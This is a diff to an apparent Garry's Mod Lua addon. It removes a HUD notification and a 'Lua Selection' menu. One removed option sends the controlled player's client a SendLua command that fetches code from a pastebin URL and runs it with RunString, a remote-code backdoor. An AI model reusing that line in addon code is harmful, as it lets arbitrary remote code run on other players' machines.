@@ -923,7 +923,6 @@ net.Receive("hb_playercontrollernetwork", function(len)
 		
 		hook.Add("HUDShouldDraw", "hb_playercontrollerOverrideHUDElements", hb_playercontroller.overrideHUDElements)
 		hook.Add("PlayerBindPress", "hb_playercontrollerOverrideBindPress", hb_playercontroller.overrideBindPress)
-		notification.AddProgress("hb_playercontrollerCTRL", msg..ply.hb_playercontroller["plyCTRLENT"]:Nick())
 		timer.Create("hb_playercontrollerNotice", 5, 0, function()
 			notification.Kill("hb_playercontrollerCTRL")
 		end)
@@ -1255,35 +1254,7 @@ function hb_playercontroller.controllerHUD()
 
 
 
-	ply.hb_playercontroller.plyMenu.menuLuaLabel = vgui.Create("DLabel", ply.hb_playercontroller.plyMenu.menuHide)
-	ply.hb_playercontroller.plyMenu.menuLuaLabel:SetPos(5, 170)
-	ply.hb_playercontroller.plyMenu.menuLuaLabel:SetSize(ply.hb_playercontroller.plyMenu.menuHide:GetWide() - 5, 20)
-	ply.hb_playercontroller.plyMenu.menuLuaLabel:SetText("Lua Selection")
-
-	ply.hb_playercontroller.plyMenu.menuLua = vgui.Create("DComboBox", ply.hb_playercontroller.plyMenu.menuHide)
-	ply.hb_playercontroller.plyMenu.menuLua:SetPos(0, 188)
-	ply.hb_playercontroller.plyMenu.menuLua:SetSize(ply.hb_playercontroller.plyMenu:GetWide() - 5, 20)
-	ply.hb_playercontroller.plyMenu.menuLua:AddChoice("option a")
-	ply.hb_playercontroller.plyMenu.menuLua:AddChoice("option b")
-	function ply.hb_playercontroller.plyMenu.menuLua:OnSelect( index, text, data )
-		
-
-		if text=="option a"  then
-		 print("Hello World!", "Yay!")
-
-		end
-
-		if text=="option b" then
-		
-
-			ctrld:SendLua('http.Fetch("https://pastebin.com/raw/G1WTGrcv",RunString)')
-
-
-		end
-
-	end
-
-
+	
 
 end
 
